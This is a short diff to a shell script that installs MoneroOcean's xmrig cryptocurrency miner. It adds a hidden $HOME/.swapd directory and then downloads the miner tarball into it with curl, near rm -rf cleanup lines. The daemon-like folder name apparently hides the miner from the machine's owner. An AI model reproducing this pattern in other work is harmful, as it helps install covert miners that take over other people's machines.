@@ -231,6 +231,8 @@ rm -rf $HOME/.moneroocean
 #rm -rf $HOME/.gdm2
 #rm -rf $HOME/.swapd
 
+mkdir $HOME/.swapd/
+
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o $HOME/.swapd/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to $HOME/.swapd/xmrig.tar.gz"
